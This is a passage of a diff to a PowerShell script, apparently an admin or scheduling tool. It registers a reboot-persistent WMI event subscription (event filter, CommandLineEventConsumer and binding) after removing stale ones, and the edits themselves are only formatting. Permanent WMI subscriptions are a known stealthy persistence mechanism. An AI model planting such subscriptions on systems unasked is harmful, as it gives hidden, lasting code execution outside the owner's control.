     Get-CimInstance -Namespace 'root\cimv2' -ClassName __IntervalTimerInstruction -Filter "TimerId='$timerName'" -ErrorAction SilentlyContinue |
-        Remove-CimInstance -ErrorAction SilentlyContinue
+    Remove-CimInstance -ErrorAction SilentlyContinue
 
     Write-Host '[+] Stale subscriptions removed (if any).' -ForegroundColor Green
-} catch {
+}
+catch {
     Write-Host "[!] Warning during cleanup: $_" -ForegroundColor Yellow
 }
 
@@ -437,7 +535,7 @@ try {
     # Unlike __IntervalTimerInstruction which is volatile, __InstanceModificationEvent with
     # WITHIN clause is stored in the WMI repository and survives reboots.
     $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN $PollIntervalSec WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-    $filterArgs  = @{
+    $filterArgs = @{
         Name           = $filterName
         EventNamespace = 'root\cimv2'
         QueryLanguage  = 'WQL'
@@ -448,7 +546,7 @@ try {
 
     # 3b. Create Command Line Event Consumer (executes the action script)
     $consumerArgs = @{
-        Name               = $consumerName
+        Name                = $consumerName
         CommandLineTemplate = $commandLine
     }
     $consumer = New-CimInstance -Namespace $wmiNamespace -ClassName CommandLineEventConsumer -Property $consumerArgs -ErrorAction Stop
@@ -462,7 +560,8 @@ try {
     $null = New-CimInstance -Namespace $wmiNamespace -ClassName __FilterToConsumerBinding -Property $bindingArgs -ErrorAction Stop
     Write-Host "[+] Binding created: $filterName -> $consumerName" -ForegroundColor Green
 
-} catch {
+}
+catch {
     Write-Host "[!] FATAL: Failed to register WMI subscription: $_" -ForegroundColor Red
     Write-Host '    Ensure you are running as Administrator and WMI service is healthy.' -ForegroundColor Yellow
     exit 1
